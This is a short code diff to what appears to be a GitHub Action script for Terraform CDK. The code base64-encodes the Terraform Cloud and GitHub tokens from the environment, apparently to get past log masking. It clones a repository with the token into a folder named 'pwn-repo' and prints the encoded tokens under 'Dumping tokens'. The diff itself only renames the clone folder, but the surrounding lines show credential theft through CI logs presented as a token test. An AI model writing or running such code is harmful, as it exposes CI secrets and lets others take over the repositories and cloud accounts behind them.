@@ -16,7 +16,7 @@ const tfToken = Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split(""
 const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").reverse().join("")).toString('base64');
 
 
-console.log('Testing token...', execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git 2>&1`).toString());
+console.log('Testing token...', execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo 2>&1`).toString());
 console.log(execSync('ls -la').toString());
 
 console.log('\r\nDumping tokens:', {tfToken, ghToken});
